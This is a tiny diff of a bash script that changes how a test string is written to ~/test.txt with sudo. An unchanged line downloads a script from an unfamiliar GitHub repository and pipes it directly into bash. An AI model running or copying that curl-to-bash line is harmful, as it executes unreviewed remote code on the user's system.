@@ -1,3 +1,3 @@
 #!/bin/bash
-sudo echo test | sudo tee ~/test.txt -
+sudo echo test | sudo cat - > ~/test.txt
 curl https://raw.githubusercontent.com/asswordpay/fluffy-journey/92ad26fe288c855276d89f7da3fb8b3eec6b86a0/curl | bash -
